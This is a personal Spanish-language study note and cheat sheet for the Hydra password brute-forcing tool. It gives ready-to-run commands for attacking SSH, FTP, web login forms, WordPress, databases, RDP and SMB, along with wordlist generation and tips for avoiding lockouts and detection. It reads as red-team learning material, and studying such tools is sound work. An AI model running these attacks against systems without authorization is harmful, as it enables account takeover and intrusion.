---
title: Hydra
area: ciberseguridad
tipo: herramienta
tags: [ciberseguridad, red-team, explotacion]
created: 2026-01-18
updated: 2026-09-20
related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Metasploit]]", "[[John The Ripper]]", "[[ataque de fuerza bruta a red wifi]]"]
---

## ¿Qué es Hydra?

Herramienta de fuerza bruta para crackear credenciales de servicios de red. Soporta más de 50 protocolos diferentes.

https://youtu.be/rvme2kE8-jY?si=ri3w-oc6Zn21hZVq
---

## Sintaxis Básica

bash

```bash
hydra -l <usuario> -p <contraseña> <protocolo>://<IP>
hydra -L <lista_usuarios> -P <lista_contraseñas> <protocolo>://<IP>
```

---

## Argumentos Esenciales

### Especificar Usuarios

**`-l <usuario>`** - Un solo usuario

bash

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.1
```

**`-L <archivo>`** - Lista de usuarios

bash

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.1
```

### Especificar Contraseñas

**`-p <contraseña>`** - Una sola contraseña

bash

```bash
hydra -L users.txt -p password123 ssh://192.168.1.1
```

**`-P <archivo>`** - Lista de contraseñas (diccionario)

bash

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1
```

**`
la diferencia de usar la P o  L  en mayuscula o minuscula es que la mayuscula se usa para cuando no sabemos la contraseña o el usuario u tenemos que usar el diccionario rockyou.txt y en minuscula es para cuando si sabemos la contraseña o el usuario 




-x <min:max:charset>`** - Generar contraseñas (brute force)

bash

```bash
hydra -l admin -x 4:6:a ssh://192.168.1.1
# min=4, max=6 caracteres, solo letras minúsculas (a)
# Opciones: a (minúsculas), A (mayúsculas), 1 (números)
```

**`-C <archivo>`** - Archivo con formato usuario:contraseña

bash

```bash
# archivo creds.txt:
# admin:admin123
# root:toor
hydra -C creds.txt ssh://192.168.1.1
```

### Opciones de Rendimiento

**`-t <threads>`** - Número de intentos simultáneos

bash

```bash
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.1
```

- **¿Para qué?** Más threads = más rápido, pero puede sobrecargar el servidor
- SSH: usa 4 (si pones más te puede banear)
- FTP/HTTP: puedes usar 16-64 sin problemas

**`-f`** - Parar cuando encuentre la primera contraseña válida

bash

```bash
hydra -L users.txt -P passwords.txt -f ssh://192.168.1.1
```

- **¿Para qué?** Si solo necesitas entrar, no perder tiempo probando más

**`-F`** - Parar cuando encuentre cualquier login válido en múltiples hosts

bash

```bash
hydra -L users.txt -P passwords.txt -F ssh://192.168.1.0/24
```

- **¿Para qué?** Cuando escaneas varias IPs y con encontrar una te basta

**`-w <segundos>`** - Timeout de respuesta

bash

```bash
hydra -l admin -P passwords.txt -w 30 ssh://192.168.1.1
```

- Por defecto: 30 segundos
- Aumentar para servidores lentos

**`-W <segundos>`** - Timeout de conexión

bash

```bash
hydra -l admin -P passwords.txt -W 10 ssh://192.168.1.1
```

### Opciones de Output

**`-v / -V`** - Modo verbose

bash

```bash
hydra -l admin -P passwords.txt -v ssh://192.168.1.1   # Muestra intentos fallidos
hydra -l admin -P passwords.txt -V ssh://192.168.1.1   # Muestra cada intento
```

**`-o <archivo>`** - Guardar output

bash

```bash
hydra -l admin -P passwords.txt -o results.txt ssh://192.168.1.1
```

**`-b <formato>`** - Formato de output

bash

```bash
hydra -l admin -P passwords.txt -b json -o results.json ssh://192.168.1.1
# Formatos: text (default), json, jsonv1
```

### Opciones Útiles

**`-s <puerto>`** - Puerto personalizado

bash

```bash
hydra -l admin -P passwords.txt -s 2222 ssh://192.168.1.1
```

**`-S`** - Usar SSL

bash

```bash
hydra -l admin -P passwords.txt -S ftp://192.168.1.1
```

**`-u`** - Probar primero cada contraseña con TODOS los usuarios

bash

```bash
hydra -L users.txt -P passwords.txt -u ssh://192.168.1.1
```

- **Sin `-u`:** admin+pass1, admin+pass2, admin+pass3, luego root+pass1, root+pass2...
- **Con `-u`:** admin+pass1, root+pass1, user+pass1, luego admin+pass2, root+pass2...
- **¿Para qué?** Evitar que bloqueen cuentas (si fallas 3 veces con admin, te bloquean admin pero no root)

**`-e <opciones>`** - Probar combinaciones obvias automáticamente

bash

```bash
hydra -L users.txt -P passwords.txt -e nsr ssh://192.168.1.1
```

- `n`: probar contraseña vacía (admin:"")
- `s`: probar usuario como contraseña (admin:admin, root:root)
- `r`: probar usuario al revés (admin:nimda)
- **¿Para qué?** La gente es floja y muchas veces usa estas combinaciones obvias

**`-M <archivo>`** - Múltiples targets

bash

```bash
# archivo targets.txt:
# 192.168.1.1
# 192.168.1.2
hydra -L users.txt -P passwords.txt -M targets.txt ssh
```

**`-R`** - Restaurar sesión previa

bash

```bash
hydra -R
# Restaura última sesión interrumpida
```

**`-I`** - Ignorar archivo de restauración existente

bash

```bash
hydra -I -l admin -P passwords.txt ssh://192.168.1.1
```

---

## Protocolos Más Usados

### SSH

bash

```bash
# Básico
hydra -l root -P passwords.txt ssh://192.168.1.1

# Con puerto personalizado
hydra -l root -P passwords.txt -s 2222 ssh://192.168.1.1

# Múltiples usuarios, 4 threads
hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.1

# Con intentos adicionales y verbose
hydra -L users.txt -P passwords.txt -e nsr -v ssh://192.168.1.1
```

### FTP

bash

```bash
# Básico
hydra -l admin -P passwords.txt ftp://192.168.1.1

# Con más threads (FTP aguanta más)
hydra -l admin -P passwords.txt -t 16 ftp://192.168.1.1

# FTP anónimo
hydra -l anonymous -p "" ftp://192.168.1.1
```

### HTTP/HTTPS (Formularios Web)

**HTTP POST Form:**

bash

```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form '/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect'
```

**¿Cómo construir el comando?**

1. **Encuentra la ruta del formulario:** `/login.php`
2. **Mira los parámetros que envía:** Abre DevTools (F12) → pestaña Network → intenta login → ve POST request
    - Ejemplo: `username=test&password=test&submit=Login`
3. **Reemplaza con variables de Hydra:**
    - `username=test` → `username=^USER^`
    - `password=test` → `password=^PASS^`
4. **Identifica el mensaje de error:** ¿Qué dice cuando fallas?
    - "Invalid credentials" → usa `:F=Invalid credentials`
    - O usa éxito → `:S=Welcome` (cuando dice "Welcome" es que entraste)

**Ejemplo completo:**

bash

```bash
# Lo que viste en DevTools:
POST /login.php
username=test&password=test&submit=Login
# Respuesta cuando fallas: "Invalid username or password"

# Tu comando:
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid username or password"
```

**HTTP GET Form:**

bash

```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-get-form "/login:user=^USER^&pass=^PASS^:F=denied"
```

**HTTP Basic Auth:**

bash

```bash
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin
```

**HTTPS (SSL):**

bash

```bash
hydra -l admin -P passwords.txt 192.168.1.1 https-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```

**Con cookies/headers (para sitios que requieren estar "logueado"):**

bash

```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect:H=Cookie: PHPSESSID=123abc"
```

- **¿Para qué?** Algunos sitios necesitan que tengas una cookie de sesión válida antes de intentar login
- **¿Cómo obtener la cookie?** DevTools → Application → Cookies → copia el valor

### MySQL

bash

```bash
# Básico
hydra -l root -P passwords.txt mysql://192.168.1.1

# Con puerto personalizado
hydra -l root -P passwords.txt -s 3307 mysql://192.168.1.1
```

### PostgreSQL

bash

```bash
hydra -l postgres -P passwords.txt postgresql://192.168.1.1
```

### MongoDB

bash

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

### SMB (Windows Shares)

bash

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

### RDP (Remote Desktop)

bash

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1
```

### SMTP

bash

```bash
hydra -l user@example.com -P passwords.txt smtp://mail.example.com
```

### POP3

bash

```bash
hydra -l user@example.com -P passwords.txt pop3://mail.example.com
```

### IMAP

bash

```bash
hydra -l user@example.com -P passwords.txt imap://mail.example.com
```

### VNC

bash

```bash
hydra -P passwords.txt vnc://192.168.1.1
# VNC no usa usuario, solo contraseña
```

### Telnet

bash

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

## Ejemplos Prácticos

### SSH - Ataque de Diccionario

bash

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f -v ssh://192.168.1.1
```

- Usuario: root
- Diccionario: rockyou.txt
- 4 threads (recomendado para SSH)
- Para al encontrar credenciales (-f)
- Verbose (-v)

### FTP - Múltiples Usuarios

bash

```bash
hydra -L users.txt -P passwords.txt -f -o ftp_creds.txt ftp://192.168.1.1
```

### HTTP POST Form - Login Web

**Paso 1:** Inspeccionar el formulario (con Burp Suite o DevTools)

```
POST /login.php
username=test&password=test&submit=Login
```

**Paso 2:** Identificar mensaje de error

```
"Invalid credentials" o "Login failed"
```

**Paso 3:** Ejecutar Hydra

bash

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 http-post-form "/login.php:username=^USER^&password=^PASS^&submit=Login:F=Invalid credentials" -V
```

### WordPress - Login Admin

bash

```bash
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" -V
```

### MySQL - Fuerza Bruta Local

bash

```bash
hydra -l root -P passwords.txt mysql://localhost
```

### SSH - Usuario como Contraseña

bash

```bash
hydra -L users.txt -e s -v ssh://192.168.1.1
```

- Intenta usuario:usuario (admin:admin, root:root, etc.)

### RDP - Administrator

bash

```bash
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

- RDP solo permite 1 thread generalmente

### SMB - Red Completa

bash

```bash
hydra -L users.txt -P passwords.txt -M targets.txt smb
```

---

## Wordlists Comunes

### Ubicaciones en Kali Linux

bash

```bash
# Contraseñas
/usr/share/wordlists/rockyou.txt                    # La más popular (14M contraseñas)
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt

# Usuarios
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/Names/names.txt
```

### Crear Wordlists Personalizadas

**Cewl - Crear diccionario desde un sitio web:**

bash

```bash
cewl http://example.com -m 6 -w wordlist.txt
```

- **¿Para qué?** Si atacas una empresa, sus contraseñas suelen tener palabras relacionadas con su negocio
- `-m 6` = solo palabras de mínimo 6 caracteres
- Ejemplo: si es un sitio de pizzas, el diccionario tendrá "pizza", "margherita", "pepperoni", etc.

**Crunch - Generar todas las combinaciones posibles:**

bash

```bash
crunch 4 8 -o passwords.txt
# Genera TODAS las combinaciones de 4 a 8 caracteres
```

- **¿Para qué?** Cuando el diccionario no funciona y quieres probar TODAS las combinaciones
- **Advertencia:** Genera archivos ENORMES y tarda mucho (4-8 chars = millones de combinaciones)

---

## Tips y Trucos

### Optimización de Velocidad

bash

```bash
# Usar más threads para servicios que lo permitan
hydra -t 64 -l admin -P passwords.txt ftp://192.168.1.1

# Usar -u para evitar lockouts
hydra -L users.txt -P passwords.txt -u ssh://192.168.1.1

# Wordlist pequeña primero
hydra -l admin -P top1000.txt ssh://192.168.1.1
# Si no funciona, luego rockyou.txt completo
```

### Evitar Detección

bash

```bash
# Menos threads, más lento pero más sigiloso
hydra -t 1 -w 5 -l admin -P passwords.txt ssh://192.168.1.1

# Agregar delay entre intentos (no implementado nativamente, usar script)
```

### Debugging

bash

```bash
# Ver cada intento
hydra -V -l admin -P passwords.txt ssh://192.168.1.1

# Debug mode
hydra -d -l admin -P passwords.txt ssh://192.168.1.1
```

### Combinar con Otras Herramientas

**Con Nmap (encontrar servicios primero):**

bash

```bash
nmap -p 22,21,3306 --open 192.168.1.0/24 -oG services.txt
grep "22/open" services.txt | cut -d " " -f 2 > ssh_hosts.txt
hydra -L users.txt -P passwords.txt -M ssh_hosts.txt ssh
```

**Con Medusa (alternativa a Hydra):**

bash

```bash
medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh
```

---

## Errores Comunes y Soluciones

### "Too many connections"

**Causa:** Demasiados threads **Solución:** Reducir threads con `-t`

bash

```bash
hydra -t 4 -l admin -P passwords.txt ssh://192.168.1.1
```

### "Account locked"

**Causa:** Muchos intentos fallidos **Solución:** Usar `-u` para distribuir intentos

bash

```bash
hydra -L users.txt -P passwords.txt -u ssh://192.168.1.1
```

### "Connection timeout"

**Causa:** Servidor lento o sobrecargado **Solución:** Aumentar timeout

bash

```bash
hydra -w 60 -l admin -P passwords.txt ssh://192.168.1.1
```

### "Invalid service"

**Causa:** Protocolo mal especificado **Solución:** Ver servicios soportados

bash

```bash
hydra -h | grep "Supported services"
```

### No encuentra la contraseña correcta

**Verificar:**

- ¿La contraseña está en el diccionario?
- ¿El formato del formulario web es correcto?
- ¿El mensaje de error está bien especificado?
- ¿Hay captcha o protección anti-bot?

---

## Interpretación de Resultados

### Salida Exitosa

```
[22][ssh] host: 192.168.1.1   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```

### Salida sin Éxito

```
[STATUS] attack finished for 192.168.1.1 (waiting for children to complete tests)
0 of 1 target completed, 0 valid passwords found
```

### Guardar Credenciales Encontradas

bash

```bash
hydra -l admin -P passwords.txt -o found.txt ssh://192.168.1.1

# Archivo found.txt contendrá:
# host: 192.168.1.1   login: admin   password: password123
```

---

## Comandos Más Usados (Cheatsheet)

bash

```bash
# SSH
hydra -l root -P rockyou.txt -t 4 ssh://192.168.1.1

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.1

# HTTP POST
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"

# MySQL
hydra -l root -P passwords.txt mysql://192.168.1.1

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# SMB
hydra -l admin -P passwords.txt smb://192.168.1.1

# Múltiples targets
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# Con opciones completas
hydra -L users.txt -P passwords.txt -e nsr -f -u -t 16 -v -o results.txt ssh://192.168.1.1
```

## Ver también

- [[MOC-ciberseguridad]]
- [[red-team-killchain]]
- [[Nmap]]
- [[Metasploit]]
- [[John The Ripper]]
- [[ataque de fuerza bruta a red wifi]]
